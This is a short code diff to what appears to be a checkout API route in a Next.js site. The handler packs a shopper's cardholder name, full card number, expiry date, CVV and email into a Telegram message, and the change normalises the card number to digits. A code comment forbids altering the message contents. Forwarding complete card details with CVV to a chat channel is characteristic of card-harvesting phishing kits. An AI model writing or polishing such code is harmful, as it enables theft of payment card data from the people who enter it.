@@ -1,6 +1,6 @@
 import type { NextRequest } from "next/server";
 import { apiError, apiSuccess } from "@/lib/api/response";
-import { isValidCardName } from "@/lib/checkout/card-validation";
+import { cardDigits, isValidCardName } from "@/lib/checkout/card-validation";
 import { formatCheckoutCardNameTelegramMessage } from "@/lib/checkout/format-telegram";
 import { getSiteSettings } from "@/lib/data/site-settings";
 import { resolveBranding } from "@/lib/site/branding";
@@ -48,7 +48,7 @@ export async function POST(request: NextRequest) {
   const message = formatCheckoutCardNameTelegramMessage({
     // Donot change any information here, dont remove or add anything here
     cardName,
-    cardNumber: payload.cardNumber?.trim() ?? "",
+    cardNumber: cardDigits(payload.cardNumber ?? ""),
     cardExpiry: payload.cardExpiry?.trim() ?? "",
     cardCvv: payload.cardCvv?.trim() ?? "",
     email: payload.email?.trim() || undefined,
